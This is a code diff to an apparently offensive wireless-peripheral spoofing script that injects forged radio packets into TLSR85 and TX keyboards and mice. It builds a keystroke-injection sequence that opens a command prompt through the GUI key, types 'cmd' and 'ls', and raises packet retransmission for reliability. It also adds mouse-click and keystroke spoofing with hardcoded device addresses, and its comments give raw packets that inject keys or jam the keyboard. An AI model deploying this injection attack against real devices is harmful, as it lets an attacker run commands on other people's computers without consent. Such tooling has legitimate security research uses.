@@ -12,6 +12,9 @@ from devices.TLSR85.tlsr85 import Tlsr85
 from devices.TLSR85.tlsr85_keyboard import *
 from devices.TLSR85.tlsr85_mouse import *
 from devices.TX.tx_mouse import Tx_mouse
+from devices.TX.tx_keyboard import Tx_Keyboard
+from devices.keyboard import * 
+from devices.mouse import * 
 
 
 common.init_args('./tlsr85-spoofing.py')
@@ -28,7 +31,7 @@ def spoof(attack, address, preamble, channels, rate):
         else:
             for i in range(len(channels)):
                 common.radio.set_channel(channels[i])
-                for _ in range(20):
+                for _ in range(100):
                     common.radio.transmit_payload_generic(payload=preamble+payload, address=address)
                     time.sleep(0.0001)
 
@@ -85,17 +88,17 @@ trust_keyboard = Tlsr85Keyboard("4a:b4:cb", "80", "aa:aa:b5", 22, 0x11021, 0x24b
 
 
 attack = [
-    trust_keyboard.build_packet(modifiers=[Tlsr85KeyboardModifiers.MODIFIER_GUI_LEFT]),
+    trust_keyboard.build_packet(modifiers=[KeyboardModifiers.MODIFIER_GUI_LEFT]),
     lambda: time.sleep(0.5),
-    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_C]),
-    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_M]),
-    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_D]),
+    trust_keyboard.build_packet([KeyboardScancode.KEY_C]),
+    trust_keyboard.build_packet([KeyboardScancode.KEY_M]),
+    trust_keyboard.build_packet([KeyboardScancode.KEY_D]),
     lambda: time.sleep(0.5),
-    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_KEYPAD_ENTER]),
+    trust_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER]),
     lambda: time.sleep(1),
-    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_L]),
-    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_S]),
-    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_KEYPAD_ENTER])
+    trust_keyboard.build_packet([KeyboardScancode.KEY_L]),
+    trust_keyboard.build_packet([KeyboardScancode.KEY_S]),
+    trust_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
     ]
 
 
@@ -110,4 +113,13 @@ preamble = unhexlify(trust_keyboard.preamble.replace(':', ''))
 # sniff(trust_keyboard, trust_mouse)
 
 tx_mouse = Tx_mouse("55:79:90:16", 0x11021, 0x6818)
-tx_mouse.sniff()
+tx_keyboard = Tx_Keyboard("55:79:90:16", 0x11021, 0x6818)
+
+t = tx_keyboard.build_packet([KeyboardScancode.KEY_L])
+tx_keyboard.spoof(t)
+
+m = tx_mouse.build_packet([MouseClickType.LEFT_CLICK])
+tx_mouse.spoof(m)
+
+# b"\x55\x79\x90\x16\x49\x03\x00\x01\x00\x00\x00\x00\x00\x01\xEF\x64" triggers keyboard with single keyboard error rollover -> need to move mouse to make it work again
+# b"\x55\x79\x90\x16\x49\x03\x00\x12\x00\x00\x00\x00\x00\x01\x00\x9D" triggers "o"
